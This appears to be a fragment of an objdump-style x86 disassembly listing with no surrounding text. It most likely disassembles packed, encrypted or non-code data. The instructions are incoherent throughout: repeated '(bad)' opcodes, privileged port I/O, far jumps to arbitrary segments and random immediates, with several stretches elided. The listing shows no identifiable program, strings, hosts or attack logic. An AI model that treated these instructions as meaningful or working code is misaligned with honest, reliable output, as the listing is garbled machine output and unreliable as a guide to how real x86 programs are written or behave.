  414c57:	mov    al,dh
  414c59:	fnstenv [ebx]
  414c5b:	push   ss
  414c5c:	xor    DWORD PTR [edi+0x7c],0xee76c961
  414c63:	outs   dx,DWORD PTR ds:[esi]
  414c64:	not    BYTE PTR [ecx]
  414c66:	out    dx,eax
  414c67:	push   esi
  414c68:	mov    ebx,0x562403b3
  414c6d:	in     al,0x75
  414c6f:	mov    edx,0xd85bceec
  414c74:	sbb    al,0xb7
  414c76:	in     al,0x15
  414c78:	cdq    
  414c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c7a:	enter  0x2ace,0xfd
  414c7e:	jp     0x414c57
  414c80:	add    ah,BYTE PTR [ebp+0x3e66b66]
  414c86:	xor    eax,0x766c3d37
  414c8b:	retf   
  414c8c:	cmp    DWORD PTR [ecx+0x41a34bae],ebp
  414c92:	aam    0x5b
  414c94:	jae    0x414cc4
  414c96:	or     BYTE PTR [esi+0x7],0xd6
  414c9a:	in     eax,dx
  414c9b:	push   esp
  414c9c:	out    dx,al
  414c9d:	mov    dh,0x3e
  414c9f:	fs std 
  414ca1:	add    DWORD PTR [edx+0xccff698],0x71
  414ca8:	mov    edx,0x8762acab
  414cad:	xchg   ebx,eax
  414cae:	shl    DWORD PTR [eax+edx*4],0x82
  414cb2:	xchg   edi,eax
  414cb3:	fdivrp st(5),st
  414cb5:	dec    esp
  414cb6:	pause  
  414cb8:	pushf  
  414cb9:	ss icebp 
  414cbb:	mov    bh,0x2d
  414cbd:	out    dx,eax
  414cbe:	cmc    
  414cbf:	in     al,dx
  414cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc1:	(bad)  
  414cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc3:	xchg   edx,eax
  414cc4:	sbb    BYTE PTR ds:[edx],ch
  414cc7:	aam    0xa1
  414cc9:	mov    ebp,0x64e0064d
  414cce:	mov    ds:0x7ff691de,al
  414cd3:	mov    al,0x1b
  414cd5:	lods   eax,DWORD PTR ds:[esi]
  414cd6:	mov    dl,0xff
  414cd8:	out    0x4c,al
  414cda:	jmp    0x414cd0
  414cdc:	lds    ecx,FWORD PTR [edx-0xe29be9e]
  414ce2:	outs   dx,BYTE PTR ds:[esi]
  414ce3:	test   al,0x92
  414ce5:	pop    edx
  414ce6:	cdq    
  414ce7:	(bad)  
  414ce8:	sub    al,0xe6
  414cea:	mov    ebp,0xaa7558b1
  414cef:	push   ds
  414cf0:	mov    eax,ds:0xe3a1cd
  414cf5:	test   BYTE PTR [ecx],dh
  414cf7:	sbb    BYTE PTR [eax],bl
  414cf9:	jge    0x414cff
  414cfb:	dec    esi
  414cfc:	aam    0xc5
  414cfe:	out    dx,eax
  414cff:	cmp    ebp,DWORD PTR [esi]
  414d01:	mov    bh,0x45
  414d03:	(bad)  [edx+edi*4]
  414d06:	lea    eax,[esi-0x65418057]
  414d0c:	cmp    BYTE PTR [ebx+0xddf01c9],cl
  414d12:	cmp    bl,BYTE PTR [ebp+0x6794e225]
  414d18:	cdq    
  414d19:	dec    ebx
  414d1a:	cmp    al,BYTE PTR [ebp+0x32]
  414d1d:	pop    es
  414d1e:	hlt    
  414d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d20:	(bad)  
  414d21:	push   edx
  414d22:	mov    ds,WORD PTR [edx]
  414d24:	fdivr  QWORD PTR [eax+0x6d]
  414d27:	xor    al,0xcd
  414d29:	inc    eax
  414d2a:	push   edx
  414d2b:	jle    0x414cd5
  414d2d:	jo     0x414d43
  414d2f:	jae    0x414da8
  414d31:	sbb    DWORD PTR [ebp-0x3c],ebx
  414d34:	jno    0x414d36
	...
  414d96:	mov    bh,0x99
  414d98:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414d9e:	sbb    DWORD PTR [esi+0x33061445],ebp
  414da4:	out    0xa1,al
  414da6:	xor    ebx,ecx
  414da8:	add    BYTE PTR [eax],al
  414daa:	pop    es
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [edx-0x80],al
  414db0:	push   eax
  414db1:	outs   dx,DWORD PTR ds:[esi]
  414db2:	mov    al,ds:0xaf805a5
  414db7:	push   cs
  414db8:	retf   
  414db9:	cwde   
  414dba:	fcom   DWORD PTR [edi-0x19]
  414dbd:	mov    WORD PTR [ecx+0x7a],?
  414dc0:	mov    cl,0x1f
  414dc2:	into   
  414dc3:	mov    esi,0x1b960b17
  414dc8:	inc    eax
  414dc9:	test   al,0x6e
  414dcb:	mov    esp,0x7f046b92
  414dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dd1:	test   eax,0x41f7b5fa
  414dd6:	stc    
  414dd7:	add    BYTE PTR [ebp+0x47],0xce
  414ddb:	repnz mov al,ds:0x6fa47866
  414de1:	inc    ebx
  414de2:	loop   0x414e43
  414de4:	out    dx,eax
  414de5:	daa    
  414de6:	dec    esp
  414de7:	and    al,0x23
  414de9:	test   al,ah
  414deb:	imul   DWORD PTR [esi+0x69]
  414dee:	jae    0x414e0a
  414df0:	shl    BYTE PTR [edi-0x3],0x1b
  414df4:	lea    eax,[ecx]
  414df6:	les    ebx,FWORD PTR [ecx-0x72]
  414df9:	es aad 0x84
  414dfc:	pop    ebx
  414dfd:	cmp    eax,0x4bbd4669
  414e02:	mov    cl,0xe0
  414e04:	in     eax,dx
  414e05:	inc    ebp
  414e06:	jge    0x414e23
  414e08:	call   0xabd66072
  414e0d:	ss mov ah,0xf7
  414e10:	mov    edx,0x21a258fc
  414e15:	popa   
  414e16:	push   ss
  414e17:	push   ebp
  414e18:	sbb    DWORD PTR [ecx-0x7f],esp
  414e1b:	jno    0x414e89
  414e1d:	mov    dh,0x75
  414e1f:	xlat   BYTE PTR ds:[ebx]
  414e20:	aas    
  414e21:	dec    ecx
  414e22:	pop    ds
  414e23:	mov    eax,0x304dc8b9
  414e28:	sbb    BYTE PTR [ebx],dh
  414e2a:	loop   0x414e14
  414e2c:	imul   edx,DWORD PTR [edi+0x52ecf936],0xffffff8c
  414e33:	hlt    
  414e34:	lahf   
  414e35:	sbb    ebp,DWORD PTR [bp+si-0x295d]
  414e3a:	outs   dx,BYTE PTR ds:[esi]
  414e3b:	pop    esi
  414e3c:	xor    eax,0x9eef8c1b
  414e41:	frstor [ebp+ecx*8+0x3e]
  414e45:	test   al,0x66
  414e47:	into   
  414e48:	mov    al,0xb5
  414e4a:	lea    ax,[edi]
  414e4d:	jl     0x414e46
  414e4f:	pop    esp
  414e50:	adc    dh,BYTE PTR [ecx+0x51]
  414e53:	lahf   
  414e54:	call   0xb7296d2b
  414e59:	test   DWORD PTR [edx],0x597a944f
  414e5f:	mov    ss,WORD PTR [eax-0x39957900]
  414e65:	daa    
  414e66:	mov    esp,0xa5704ebc
  414e6b:	ret    0xebd6
  414e6e:	jmp    0x1e7995bb
  414e73:	mov    dl,0xfb
  414e75:	add    eax,0xbfb01a75
  414e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e7b:	retf   
  414e7c:	mov    eax,ds:0xae2015b2
  414e81:	nop
  414e82:	rol    BYTE PTR [eax-0x1f91e278],cl
  414e88:	sub    DWORD PTR [eax-0xcea0426],edi
  414e8e:	and    al,0xb4
  414e90:	fcmovnu st,st(6)
  414e92:	xor    cl,bh
  414e94:	(bad)  
  414e95:	ror    BYTE PTR [edx+0x36fa2efa],cl
  414e9b:	cmp    DWORD PTR [eax-0x1a],0xe
  414e9f:	pop    es
  414ea0:	icebp  
  414ea1:	loopne 0x414e5a
  414ea3:	xor    dl,BYTE PTR ds:0x26910d9a
  414ea9:	xchg   DWORD PTR [ebp+0x483dce41],edi
  414eaf:	mov    dh,0x65
  414eb1:	imul   esi,DWORD PTR [ecx+edi*8],0x5e
	...
  414f14:	add    BYTE PTR [eax],al
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	pop    ds
  414f23:	leave  
  414f24:	cdq    
  414f25:	adc    al,0x3a
  414f27:	fiadd  DWORD PTR [eax]
  414f29:	add    BYTE PTR [edi],al
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    ch,ah
  414f2f:	lahf   
  414f30:	inc    esi
  414f31:	and    BYTE PTR [edx+0x34],bl
  414f34:	leave  
  414f35:	mov    WORD PTR [eax+0x2df238b2],ds
  414f3b:	xchg   ebx,eax
  414f3c:	addr16 jno 0x414f78
  414f3f:	and    al,0xec
  414f41:	fiadd  DWORD PTR [esi-0x74]
  414f44:	pusha  
  414f45:	outs   dx,BYTE PTR ds:[esi]
  414f46:	stc    
  414f47:	lods   eax,DWORD PTR ds:[esi]
  414f48:	pop    ebp
  414f4a:	aam    0xf
  414f4c:	ds pop es
  414f4e:	imul   ecx
  414f50:	pop    ecx
  414f51:	push   esp
  414f52:	or     al,0x53
  414f54:	xchg   DWORD PTR [eax],edx
  414f56:	das    
  414f57:	jbe    0x414f44
  414f59:	in     al,dx
  414f5a:	enter  0x7bad,0x8a
  414f5e:	pusha  
  414f5f:	mov    ch,0x37
  414f61:	sbb    cl,BYTE PTR [eax+ebx*4]
  414f64:	ret    0x4ca9
  414f67:	cmp    BYTE PTR [ecx],al
  414f69:	cmp    BYTE PTR [eax],dl
  414f6b:	push   edi
  414f6c:	int    0xb9
  414f6e:	xchg   ecx,eax
  414f6f:	pop    es
  414f70:	mov    ebx,DWORD PTR [ecx]
  414f72:	shl    BYTE PTR [ebx],1
  414f74:	sahf   
  414f75:	inc    esi
  414f76:	ja     0x414f84
  414f78:	les    eax,FWORD PTR [ebp-0x1e603f30]
  414f7e:	ss xchg esp,eax
  414f80:	arpl   WORD PTR [eax-0x61e6bd1a],di
  414f86:	hlt    
  414f87:	test   al,0xaa
  414f89:	arpl   WORD PTR [edx-0xa],sp
  414f8c:	and    esi,esp
  414f8e:	retf   0xa955
  414f91:	jmp    0xf086:0xac3cf777
  414f98:	out    0xc2,al
  414f9a:	out    dx,al
  414f9b:	and    ebx,DWORD PTR [edi+0x5e]
  414f9e:	mov    esi,DWORD PTR [ebx-0x54]
  414fa1:	cld    
  414fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa3:	aaa    
  414fa4:	dec    esi
  414fa5:	stos   BYTE PTR es:[edi],al
  414fa6:	inc    edx
  414fa7:	cli    
  414fa8:	inc    ecx
  414fa9:	push   ebx
  414faa:	pop    edx
  414fab:	scas   eax,DWORD PTR es:[edi]
  414fac:	dec    ebp
  414fad:	popa   
  414fae:	pop    ss
  414faf:	mov    ds:0x1b8bd96e,al
  414fb4:	inc    eax
  414fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb6:	mov    esp,0xe2d60c55
  414fbb:	fsubr  DWORD PTR [ebx-0x2001f13d]
  414fc1:	in     eax,dx
  414fc2:	(bad)  
  414fc3:	fild   WORD PTR [ebp-0x12cf615]
  414fc9:	xchg   ebp,eax
  414fca:	jecxz  0x415005
  414fcc:	scas   eax,DWORD PTR es:[edi]
  414fcd:	xchg   BYTE PTR [ebx+0x74d92cc],al
  414fd3:	fwait
  414fd4:	push   es
  414fd5:	icebp  
  414fd6:	inc    ebp
  414fd7:	(bad)  [ebp-0x53e48328]
  414fdd:	pusha  
  414fde:	or     al,0x59
  414fe1:	mov    bl,0xb2
  414fe3:	jmp    0x873c759e
  414fe8:	std    
  414fe9:	dec    eax
  414fea:	outs   dx,BYTE PTR ds:[esi]
  414feb:	dec    ecx
  414fec:	test   esp,edx
  414fee:	je     0x415061
  414ff0:	loope  0x414fa7
  414ff2:	mov    gs,edx
  414ff4:	daa    
  414ff5:	clc    
  414ff6:	mov    eax,0xf7a4989c
  414ffb:	retf   0x34a4
  414ffe:	daa    
  414fff:	int3   
  415000:	pop    eax
  415001:	test   DWORD PTR [edx],ebx
  415003:	mov    eax,ds:0x2742e684
  415008:	pop    edx
  415009:	rcr    DWORD PTR [ecx-0x5e],cl
  41500c:	sub    BYTE PTR [esp+edi*4],ch
  41500f:	xlat   BYTE PTR ds:[ebx]
  415010:	push   esi
  415011:	(bad)  
  415012:	aad    0x6f
  415014:	mov    dl,0x54
  415016:	mov    esp,0x40744f64
  41501b:	dec    ebx
  41501c:	cmc    
  41501d:	cmp    esp,DWORD PTR [edx-0x76]
  415020:	adc    al,0x94
  415022:	aaa    
  415023:	mov    ss,edi
  415025:	sti    
  415026:	cs out dx,al
  415028:	retf   
  415029:	fldcw  WORD PTR [edx]
  41502b:	loope  0x41506b
  41502d:	or     al,0x2
  41502f:	mov    dl,0x1e
  415031:	xchg   DWORD PTR [eax+0xa263],ebp
	...
  415093:	add    BYTE PTR [eax],al
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0x9fdb97a1
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [ebx],bh
  4150af:	add    eax,eax
  4150b1:	(bad)  
  4150b3:	jbe    0x415067
  4150b5:	jg     0x41512d
  4150b7:	outs   dx,BYTE PTR ds:[esi]
  4150b8:	out    0x5e,eax
  4150ba:	jmp    0x4150c3
  4150bc:	movhps xmm3,QWORD PTR [edi]
  4150bf:	and    eax,0xae1c5d79
  4150c4:	daa    
  4150c5:	sub    DWORD PTR [ebp-0x7d58627e],edx
  4150cb:	xchg   edx,eax
  4150cc:	push   edi
  4150cd:	dec    eax
  4150ce:	aam    0x4
  4150d0:	sbb    esi,DWORD PTR [edx-0x6e]
  4150d3:	mov    ebx,0x26f11526
  4150d8:	or     al,0xa0
  4150da:	mov    eax,ds:0x85711d0e
  4150df:	ficom  WORD PTR [edx]
  4150e1:	mov    al,ds:0x8fe40d38
  4150e6:	fisub  WORD PTR [ebp+0x8]
  4150e9:	psubb  mm0,QWORD PTR [esi+0x5ce7c89]
  4150f0:	(bad)  
  4150f1:	sbb    DWORD PTR ds:0x10470b15,ebx
  4150f7:	loop   0x4150f2
  4150f9:	sbb    esi,DWORD PTR [ecx]
  4150fb:	push   cs
  4150fc:	sahf   
  4150fd:	adc    DWORD PTR ds:0x92fec37e,ecx
  415103:	push   0xe563dfb6
  415108:	cmp    ch,BYTE PTR [edi]
  41510a:	add    al,0xfe
  41510c:	xor    al,0x52
  41510e:	pop    ss
  41510f:	test   BYTE PTR [edi+0x1ed5edf9],al
  415115:	xchg   edi,eax
  415116:	iret   
  415117:	xchg   DWORD PTR ds:[esi],esi
  41511a:	ja     0x41510c
  41511c:	pop    edi
  41511d:	imul   esp,DWORD PTR [edx],0xffffffcf
  415120:	adc    ecx,DWORD PTR [esi]
  415122:	stos   BYTE PTR es:[edi],al
  415123:	scas   eax,DWORD PTR es:[edi]
  415124:	mov    eax,ds:0xc066df43
  415129:	pop    ebp
  41512a:	inc    edi
  41512b:	cmp    eax,0x551a513d
  415130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415131:	mov    bh,ch
  415133:	xchg   edx,eax
  415134:	mov    bh,0xbc
  415136:	inc    edi
  415137:	lahf   
  415138:	dec    esi
  415139:	cdq    
  41513a:	mov    edi,0x9b790d12
  41513f:	dec    esi
  415140:	or     BYTE PTR [edi+ebx*2-0x57],dl
  415144:	dec    ecx
  415145:	mov    ebp,0xbd382ffb
  41514a:	je     0x41514d
  41514c:	or     bl,BYTE PTR [ebx]
  41514e:	mov    WORD PTR [ebx+0x4bdbd15],ds
  415154:	jmp    0x415196
  415156:	aad    0x5a
  415158:	jmp    0xe1a2efc2
  41515d:	dec    esp
  41515e:	rcl    ebp,cl
  415160:	push   0xffffff9b
  415162:	stos   BYTE PTR es:[edi],al
  415163:	fdivr  DWORD PTR [edx-0x3db981ab]
  415169:	mov    DWORD PTR [ecx],esp
  41516b:	push   ecx
  41516c:	dec    ebx
  41516d:	leave  
  41516e:	cld    
  41516f:	mov    edx,0xa66d352d
  415174:	jecxz  0x415113
  415176:	sbb    BYTE PTR [edi+0x1e],cl
  415179:	xor    DWORD PTR [esi-0x1483133b],ecx
  41517f:	push   edx
  415180:	dec    esi
  415181:	mov    cl,bh
  415183:	jo     0x4151c2
  415185:	pop    edi
  415186:	push   esi
  415187:	adc    al,0x1a
  415189:	(bad)  
  41518a:	lds    ebx,FWORD PTR [esi]
  41518c:	adc    edi,DWORD PTR [ecx+eax*8]
  41518f:	xchg   esp,eax
  415190:	xor    esp,DWORD PTR [eax]
  415192:	add    eax,0x7fbd3dd7
  415197:	in     al,dx
  415198:	js     0x41520a
  41519a:	leave  
  41519b:	xchg   DWORD PTR [esi-0x25],ebx
  41519e:	xor    BYTE PTR ds:0x84f06d2e,al
  4151a4:	cmove  esi,DWORD PTR [edx]
  4151a7:	not    BYTE PTR [ebx-0x6d]
  4151aa:	loope  0x4151fa
  4151ac:	xlat   BYTE PTR ds:[ebx]
  4151ad:	dec    ebx
  4151ae:	call   0xfcb34506
  4151b3:	mov    ds:0x3,al
	...
  415214:	add    BYTE PTR [eax],al
  415216:	sub    al,0x97
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0xb8
  415223:	and    ch,cl
  415225:	ret    0xdc48
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [ebx-0x23f83d5e],al
  415233:	dec    ebx
  415234:	xchg   esp,eax
  415235:	jmp    0x4151d2
  415237:	pop    ebx
  415238:	jbe    0x415225
  41523a:	pop    ebp
  41523b:	adc    eax,0x5f4efb9
  415240:	(bad)  
  415242:	sub    edi,DWORD PTR [ebx]
  415244:	aaa    
  415245:	test   esp,0xf0dfb9d6
  41524b:	or     al,0xdb
  41524d:	pop    es
  41524e:	sbb    eax,0xdc681949
  415253:	imul   edi,edi,0x5
  415256:	lods   eax,DWORD PTR ds:[esi]
  415257:	dec    edx
  415258:	(bad)  
  415259:	push   edx
  41525a:	mov    dh,0xb3
  41525c:	shl    BYTE PTR ds:0xd3ec002,cl
  415262:	jns    0x415273
  415264:	push   edi
  415265:	hlt    
  415266:	(bad)  
  415267:	sbb    bl,BYTE PTR [ebx-0x75]
  41526a:	sub    cl,BYTE PTR [eax+0x5b36be49]
  415270:	mov    cl,0x1d
  415272:	out    0x7c,al
  415274:	adc    BYTE PTR cs:[edi+0x1cb89df3],ah
  41527b:	push   esp
  41527c:	loope  0x4152fd
  41527e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41527f:	mov    gs,WORD PTR [eax+eiz*4-0x13c64b4f]
  415286:	popf   
  415287:	cmovno ecx,DWORD PTR [eax-0x76]
  41528b:	and    al,0x4d
  41528d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41528e:	mov    bl,0xe3
  415290:	mov    edi,0x48fa0dd
  415295:	or     al,0xce
  415297:	ret    
  415298:	dec    esi
  415299:	not    ch
  41529b:	sbb    dh,BYTE PTR [eax+0xe75180]
  4152a1:	shr    BYTE PTR [edi+0x15],1
  4152a4:	jne    0x415249
  4152a6:	push   ds
  4152a7:	mov    WORD PTR [esi+0x291c330e],fs
  4152ad:	or     ecx,DWORD PTR [eax-0x6c]
  4152b0:	inc    ebp
  4152b1:	pop    edi
  4152b2:	smsw   WORD PTR [ebx]
  4152b5:	xchg   ebp,esi
  4152b7:	xchg   edx,eax
  4152b8:	js     0x4152a6
  4152ba:	sub    ebx,DWORD PTR [eax]
  4152bc:	ror    DWORD PTR [ecx-0x5ef62831],cl
  4152c2:	and    dl,BYTE PTR [esi]
  4152c4:	aam    0xe1
  4152c6:	lea    ecx,[esi]
  4152c8:	pop    esi
  4152c9:	inc    ecx
  4152ca:	sbb    dh,al
  4152cc:	mov    edx,DWORD PTR [eax]
  4152ce:	dec    ecx
  4152cf:	sbb    al,0x42
  4152d1:	into   
  4152d2:	int3   
  4152d3:	mov    eax,ds:0xb6997650
  4152d8:	lock test bh,dh
  4152db:	ja     0x415320
  4152dd:	mov    BYTE PTR [eax+0x6],0x34
  4152e1:	xchg   ebp,eax
  4152e2:	fadd   st(1),st
  4152e4:	pop    ss
  4152e5:	sar    BYTE PTR [esi],cl
  4152e7:	pop    ecx
  4152e8:	sbb    esi,DWORD PTR [esp+ebx*8-0x355e6acf]
  4152ef:	hlt    
  4152f0:	cmp    al,0xbd
  4152f2:	fadd   DWORD PTR [edx+0x5b]
  4152f5:	rcr    BYTE PTR [ecx+0x12],1
  4152f8:	sti    
  4152f9:	imul   eax,ebx,0xffffff9e
  4152fc:	mov    al,0xaa
  4152fe:	fwait
  4152ff:	xchg   esi,eax
  415300:	test   BYTE PTR [ecx-0x1c],bh
  415303:	jmp    0x2a08:0x4def0f72
  41530a:	sbb    BYTE PTR [ecx],bl
  41530c:	mov    ch,0x86
  41530e:	(bad)  
  41530f:	les    esi,FWORD PTR [eax+edx*8]
  415312:	clc    
  415313:	sub    BYTE PTR [ebp-0x52],dl
  415316:	das    
  415317:	mov    dl,0xd4
  415319:	push   0x7a
  41531b:	out    dx,al
  41531c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41531d:	leave  
  41531e:	jbe    0x415392
  415320:	jl     0x59d5c2f6
  415326:	sub    bl,bl
  415328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415329:	xchg   DWORD PTR [ebx-0x4fe80123],ebp
  41532f:	pop    edi
  415330:	popa   
  415331:	daa    
  415332:	pop    edx
  415333:	xchg   BYTE PTR [esi+0x0],dh
	...
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	lock repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0x494b9b2a
  4153a3:	xchg   DWORD PTR [ecx*8+0xdd4f],esi
  4153aa:	pop    es
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ebx-0x447c7bae],al
  4153b3:	inc    edx
  4153b4:	mov    al,0x54
  4153b6:	cmp    edx,DWORD PTR [ecx+0x3f]
  4153b9:	xor    BYTE PTR [ebp+0x1f],ah
  4153bc:	je     0x4153e1
  4153be:	aas    
  4153bf:	pop    edx
  4153c0:	inc    edi
  4153c1:	jno    0x4153a8
  4153c3:	pop    DWORD PTR [edi-0x686c6b7b]
  4153c9:	mov    ds:0xb4220c0b,eax
  4153ce:	cmp    DWORD PTR [esi-0x39],edx
  4153d1:	inc    edx
  4153d2:	dec    ebx
  4153d3:	out    0xb7,eax
  4153d5:	dec    edx
  4153d6:	shl    ah,1
  4153d8:	mov    dl,0xc7
  4153da:	and    BYTE PTR [edx+ebx*1+0x72],ch
  4153de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153df:	iret   
  4153e0:	fld    TBYTE PTR [eax-0x67ebbbbb]
  4153e6:	xor    ecx,DWORD PTR [edi]
  4153e8:	data16 sub BYTE PTR [edi-0x56],ch
  4153ec:	cmp    al,0x39
  4153ee:	in     eax,0x3c
  4153f0:	lds    eax,FWORD PTR [ebp+eax*2+0x267e94f5]
  4153f7:	bnd ret 
  4153f9:	push   eax
  4153fa:	inc    eax
  4153fb:	inc    eax
  4153fc:	cmc    
  4153fd:	xchg   ecx,eax
  4153fe:	(bad)  
  4153ff:	mov    ebx,0x124e6bd5
  415404:	push   ecx
  415405:	xchg   ebx,eax
  415406:	pushf  
  415407:	cmc    
  415408:	sub    esp,eax
  41540a:	and    DWORD PTR [ecx],0x6b
  41540d:	fcmovne st,st(6)
  41540f:	stos   BYTE PTR es:[edi],al
  415410:	retf   
  415411:	jmp    0xf673:0x2eb35a46
  415418:	rcl    DWORD PTR [eax],cl
  41541a:	add    ebx,0x76b7a3a9
  415420:	les    eax,FWORD PTR [edx]
  415422:	push   esi
  415423:	xor    al,0x20
  415425:	pop    edi
  415426:	mov    eax,ds:0xe09074d3
  41542b:	pop    ebp
  41542c:	and    DWORD PTR [ecx+0x45],eax
  41542f:	and    eax,0x8685ee40
  415434:	sbb    ecx,ecx
  415436:	mov    bl,0xca
  415438:	cmp    ah,bh
  41543a:	addr16 das 
  41543c:	dec    ebp
  41543d:	push   ds
  41543e:	call   0xa760:0x390dbb68
  415445:	ret    0xf7ff
  415448:	rcr    DWORD PTR [esi-0x46e73f71],1
  41544e:	loope  0x4153f0
  415450:	es dec esp
  415452:	sub    DWORD PTR [ecx],0x54
  415455:	mov    bl,0x7a
  415457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415458:	shr    dh,1
  41545a:	xor    dl,BYTE PTR [ecx]
  41545c:	jmp    0x69e3:0xebb0ad16
  415463:	mov    al,bl
  415465:	je     0x4154d6
  415467:	jle    0x415478
  415469:	add    dl,dh
  41546b:	mov    bl,0x60
  41546d:	fisub  WORD PTR [esi-0x246d9b67]
  415473:	lea    esp,[ebx]
  415475:	adc    DWORD PTR [edi-0x7],eax
  415478:	(bad)  
  415479:	outs   dx,DWORD PTR fs:[esi]
  41547b:	dec    ebp
  41547c:	push   esi
  41547d:	jge    0x41548e
  41547f:	in     al,0xbc
  415481:	jbe    0x4154f0
  415483:	push   ecx
  415484:	ror    ecx,0x5f
  415487:	push   esp
  415488:	pop    es
  415489:	cli    
  41548a:	ja     0x415462
  41548c:	cmc    
  41548d:	xlat   BYTE PTR ds:[ebx]
  41548e:	sub    bl,BYTE PTR [eax]
  415490:	outs   dx,BYTE PTR ds:[esi]
  415491:	sar    BYTE PTR [edi],1
  415493:	inc    ebx
  415494:	mov    ch,0x14
  415496:	sub    al,0xa9
  415498:	mov    WORD PTR [ecx+0x40e3bb2a],cs
  41549e:	jge    0x415449
  4154a0:	and    cl,dl
  4154a2:	cwde   
  4154a3:	data16 fstp QWORD PTR [ebx-0x30]
  4154a7:	je     0x415522
  4154a9:	(bad)  
  4154aa:	mov    ebx,ebx
  4154ac:	lahf   
  4154ad:	aam    0x66
  4154af:	outs   dx,BYTE PTR ds:[esi]
  4154b0:	jg     0x415459
  4154b2:	mov    eax,ds:0x5b72
	...
  415513:	add    BYTE PTR [eax],al
  415515:	add    ah,ah
  415517:	lock sub DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	ret    
  415523:	adc    BYTE PTR [ecx],ch
  415525:	xchg   esi,eax
  415526:	push   esi
  415527:	fiadd  WORD PTR [eax]
  415529:	add    BYTE PTR [edi],al
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [edx],dh
  41552f:	mov    cl,0x99
  415531:	dec    ebp
  415532:	leave  
  415533:	aaa    
  415534:	jne    0x4154ce
  415536:	cmc    
  415537:	fld    DWORD PTR [esi]
  415539:	dec    esp
  41553a:	repnz cmp eax,0x25c6092c
  415540:	xchg   ebp,eax
  415541:	sub    al,0xb9
  415543:	pop    es
  415544:	push   es
  415545:	std    
  415546:	cld    
  415547:	sti    
  415548:	(bad)  
  41554a:	js     0x415509
  41554c:	and    al,0x15
  41554e:	inc    ebx
  41554f:	out    dx,eax
  415550:	sbb    ebp,0x7d
  415553:	mov    ch,0x33
  415555:	push   0x63
  415557:	push   0x0
  415559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41555a:	and    bl,BYTE PTR ds:0x8d391c60
  415560:	inc    edi
  415561:	xor    al,0x84
  415563:	out    0x9d,eax
  415565:	jns    0x41554d
  415567:	mov    ecx,DWORD PTR [edi]
  415569:	mov    al,ds:0xc3052433
  41556e:	fist   WORD PTR [ebp-0x6f]
  415571:	inc    ebx
  415572:	mov    al,ds:0xf3916b3e
  415577:	mov    esp,0x2bff22d0
  41557c:	push   edx
  41557d:	sti    
  41557e:	pop    DWORD PTR [ecx]
  415580:	(bad)  
  415581:	mov    DWORD PTR [edi+0x5a],esi
  415584:	mov    al,ds:0x440aff67
  415589:	fdivr  QWORD PTR [esp+ebx*2+0x72]
  41558d:	adc    esi,0xeabc5704
  415593:	inc    ebp
  415594:	je     0x4155f0
  415596:	sub    al,0x57
  415598:	cmc    
  415599:	daa    
  41559a:	aas    
  41559b:	mov    cs,ecx
  41559d:	mul    BYTE PTR [edx+0x7d1c9284]
  4155a3:	shl    cl,0xe5
  4155a6:	out    0xcc,al
  4155a8:	mov    cl,0xd
  4155aa:	jp     0x4155d0
  4155ac:	leave  
  4155ad:	adc    BYTE PTR [edi+eax*8+0x6e],dl
  4155b1:	and    ch,cl
  4155b3:	dec    ebp
  4155b4:	sar    BYTE PTR [ebp-0xcf140a9],1
  4155ba:	cmc    
  4155bb:	leave  
  4155bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155bd:	push   cs
  4155be:	adc    eax,ebx
  4155c0:	loopne 0x41562d
  4155c2:	loopne 0x41554e
  4155c4:	jno    0x4155cb
  4155c6:	cld    
  4155c7:	or     bl,0x2d
  4155ca:	ins    DWORD PTR es:[edi],dx
  4155cb:	sbb    bl,BYTE PTR [ebx]
  4155cd:	shl    BYTE PTR ds:0x668266cc,0x1b
  4155d4:	xchg   BYTE PTR [esi-0x9223db4],cl
  4155da:	aad    0x5d
  4155dc:	pop    esi
  4155dd:	mov    WORD PTR [edx-0x2d90f10d],?
  4155e3:	into   
  4155e4:	adc    al,ah
  4155e6:	mul    DWORD PTR [ebx]
  4155e8:	out    dx,eax
  4155e9:	mov    DWORD PTR [ebx],ecx
  4155eb:	jb     0x415653
